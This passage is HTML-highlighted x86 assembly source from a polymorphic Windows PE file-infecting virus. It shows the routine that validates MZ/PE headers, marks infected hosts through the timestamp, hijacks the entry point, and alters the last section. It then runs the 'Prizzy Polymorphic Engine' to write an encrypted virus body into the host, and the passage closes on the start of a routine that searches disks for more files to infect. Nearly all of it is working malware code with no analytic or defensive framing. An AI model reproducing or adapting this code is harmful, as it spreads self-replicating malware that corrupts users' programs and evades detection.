        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_header</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;file pos</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">           </span><span class="sc1">;read msdos header</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">infect_file_close</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_header.MZ_magic</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">  </span><span class="sc1">;test 'MZ'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_close</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_header.MZ_crlc</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;no PE ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__okay</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_header.MZ_lfarlc</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">;bad PE ?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">infect_file_close</span><span class="sc0">

</span><span class="sc5">__okay</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_header.MZ_lfanew</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_signature</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
                </span><span class="sc5">IMAGE_SIZEOF_NT_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
                </span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">;size of PE to read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">infect_file_close</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;esi=1st section</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_signature</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> \
            </span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_close</span><span class="sc0">   </span><span class="sc1">;is it really 'PE\0\0' ?</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
            </span><span class="sc5">FH_TimeDateStamp</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">85</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;infected ?</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_close</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_header.FH_Characteristics</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_close</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">   </span><span class="sc1">;no DLL ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_close</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
            </span><span class="sc5">FH_NumberOfSections</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;eax=offs of last section</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;esi=offs of l.s. in file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_actsection</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_section</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">           </span><span class="sc1">;read last section</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">infect_file_close</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_section</span><span class="sc4">+</span><span class="sc5">SH_Characteristics</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SCN_CNT_CODE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
                </span><span class="sc5">IMAGE_SCN_MEM_EXECUTE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
                </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_close</span><span class="sc0">   </span><span class="sc1">;has l.s. these flags ?</span><span class="sc0">

        </span><span class="sc1">; alloc memory for polymorphic engine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_optional</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
            </span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">original_ep</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;save old entry-point</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_section</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \   </span><span class="sc1">;new SH_VirtualAddress</span><span class="sc0">
            </span><span class="sc5">SH_VirtualAddress</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_section</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \   </span><span class="sc1">;new SH_PointerToRawData</span><span class="sc0">
            </span><span class="sc5">SH_PointerToRawData</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infected_ep</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;RVA of virus code</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_optional</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
            </span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;New entry-point</span><span class="sc0">

        </span><span class="sc1">; run Prizzy Polymophic Engine (PPE)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_startup</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_finish</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;eax=size of virus in file</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_section</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \   </span><span class="sc1">;new SH_SizeOfRawData</span><span class="sc0">
            </span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_optional</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \  </span><span class="sc1">;new OH_SizeOfImage</span><span class="sc0">
            </span><span class="sc5">OH_SizeOfImage</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">-</span><span class="sc5">file_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_section</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \   </span><span class="sc1">;new SH_VirtualSize</span><span class="sc0">
            </span><span class="sc5">SH_VirtualSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_section</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \   </span><span class="sc1">;set these flags</span><span class="sc0">
            </span><span class="sc5">SH_Characteristics</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> \
            </span><span class="sc5">IMAGE_SCN_CNT_CODE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_EXECUTE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
            </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">03030302h</span><span class="sc0">               </span><span class="sc1">;special number</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;it can't be zero</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">85</span><span class="sc0">                  </span><span class="sc1">;encrypt one</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
            </span><span class="sc5">FH_TimeDateStamp</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_finish</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">          </span><span class="sc1">;write it</span><span class="sc0">

        </span><span class="sc1">; dealloc memory for PPE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_actsection</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_section</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">          </span><span class="sc1">;write section into PE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mz_header.MZ_lfanew</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_signature</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
                </span><span class="sc5">IMAGE_SIZEOF_NT_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
                </span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">          </span><span class="sc1">;write PE header</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Filename_Sz</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__Archive_Update_2</span><span class="sc0">
    </span><span class="sc5">__Archive_Update</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">150000</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">infect_file_close</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Filename_Sz</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_file_close</span><span class="sc0">

    </span><span class="sc5">__Archive_Update_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Archive_Filename_Sz</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__Archive_Update</span><span class="sc0">

</span><span class="sc5">infect_file_close</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fclose</span><span class="sc0">

</span><span class="sc5">infect_file_restattr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_fileattr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fsetattr</span><span class="sc0">

</span><span class="sc5">infect_file_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__iluzo_return_4</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;find "g_iluzo_return" text</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;in this file for more infoz</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ main function of infect all filez on disks ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">init_search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc5">get_base</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">;where we're into ebp</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__continue</span><span class="sc0">
